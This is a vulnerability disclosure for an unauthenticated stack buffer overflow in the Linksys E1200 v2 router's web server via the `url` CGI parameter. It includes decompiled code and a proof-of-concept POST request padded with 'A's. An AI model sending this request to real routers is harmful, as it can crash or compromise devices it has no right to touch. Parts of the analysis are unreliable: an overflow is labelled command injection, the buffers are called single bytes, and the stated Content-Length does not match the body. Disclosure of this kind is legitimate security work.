# Buffer Overflow Vulnerability in `url`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys E1200 v2 Router                                      |
| Firmware Version     | **E1200_v2.0.11.001_us.tar.gz**                              |
| Vulnerability Type   | **Stack-Based Buffer Overflow**                              |
| Vulnerable Component | `httpd` (functions `apply_cgi` & `block_cgi`, buffers `v36`, `v29`) |
| Prerequisites        | No authentication required; remote exploitation possible via CGI parameter `url` |

2. Exploitation Path

```c
int __fastcall apply_cgi(int a1, int a2, int a3, int a4, int a5, const char *a6, int a7)
{
  ...
  char v36; // [sp+28h] [-810h] BYREF
  ...
  if ( a6 )
  {
    if ( !strcmp(a6, "tmBlock.cgi") )
    {
      v36 = 0;
      memset(v37, 0, sizeof(v37));
      v17 = (const char *)get_cgi((int)"url");
      sprintf(&v36, "http://%s", v17);
      ...
    }
    if ( !strcmp(a6, "hndBlock.cgi") )
    {
      v36 = 0;
      memset(v37, 0, sizeof(v37));
      v22 = (const char *)get_cgi((int)"url");
      sprintf(&v36, "http://%s", v22);
      ...
}
  
int __fastcall block_cgi(int a1, int a2, int a3, int a4, int a5, const char *a6, int a7)
{
  ...
  char v29; // [sp+28h] [-800h] BYREF
  ...
  if ( !strcmp(a6, "tmBlock.cgi") )
  {
    v29 = 0;
    memset(v30, 0, sizeof(v30));
    v9 = (const char *)get_cgi((int)"url");
    sprintf(&v29, "http://%s", v9);
    ...
}
```

3. **Vulnerable Binaries:** `httpd`.
4. 0-Day Command Injection Exploitation Path:
   - In the `httpd` file, at line 12, `v17 = (const char *)get_cgi((int)"url")` receives data via `get_cgi` without any length restriction. At line 13, `sprintf(&v36, "http://%s", v17)` concatenates the string, where the buffer `v36` is only a single byte. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
   - In the `httpd` file, at line 20, `v22 = (const char *)get_cgi((int)"url")` receives data via `get_cgi` without any length restriction. At line 21, `sprintf(&v36, "http://%s", v22)` concatenates the string, where the buffer `v36` is only a single byte. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
   - In the `httpd` file, at line 34, `v9 = (const char *)get_cgi((int)"url")` receives data via `get_cgi` without any length restriction. At line 35, `sprintf(&v29, "http://%s", v9)` concatenates the string, where the buffer `v29` is only a single byte. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/tmBlock.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

url=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```